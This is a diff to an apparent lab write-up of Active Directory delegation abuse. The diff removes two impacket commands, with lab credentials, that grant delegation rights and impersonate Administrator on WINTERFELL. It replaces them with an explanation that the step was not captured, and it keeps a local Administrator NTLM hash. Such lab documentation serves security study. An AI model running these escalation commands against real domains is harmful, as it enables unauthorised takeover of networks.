@@ -99,22 +99,13 @@ Escalation needs two things:
 
 With both, the flow is: write `TestPC$` into the target's delegation list, request an S4U2Self ticket for `TestPC$`, then S4U2Proxy to obtain a service ticket for the target as `Administrator`.
 
-```bash
-# 1. Grant TestPC$ the right to delegate to the target computer
-impacket-rbcd -delegate-from 'TestPC$' -delegate-to 'WINTERFELL$' -action write \
-  -dc-ip 192.168.56.11 'north.sevenkingdoms.local/jon.snow:iknownothing'
-
-# 2. Request a service ticket as Administrator through the delegation
-impacket-getST -spn cifs/winterfell.north.sevenkingdoms.local \
-  -impersonate Administrator -dc-ip 192.168.56.11 \
-  'north.sevenkingdoms.local/TestPC$:TestPass!'
-```
-
-The delegation write itself is silent by design — it prints nothing, so the first visible artefact of success is the service ticket that follows. With that ticket the local SAM becomes readable, and the local Administrator hash is the next stepping stone:
+The write is silent — a successful delegation grant prints nothing to the console — so no screenshot of it was kept, and inventing the invocation would defeat the point of a write-up. What the capture sequence does show is the outcome: the next screenshot after creating `TestPC$` is a pass-the-hash run that already carries the local `Administrator` NTLM hash of `WINTERFELL`:
 
 ```text
 dbd13e1c4e338284ac4e9874f7de6ef4
 ```
+
+That hash is the product of the delegation chain above: the service ticket obtained through `TestPC$` made the local SAM readable, and the local Administrator hash is the next stepping stone. The evidence of success is the hash itself and the `(Pwn3d!)` that follows in the next section — two independent artefacts of one step.
 
 ## 6. Confirming the access
 
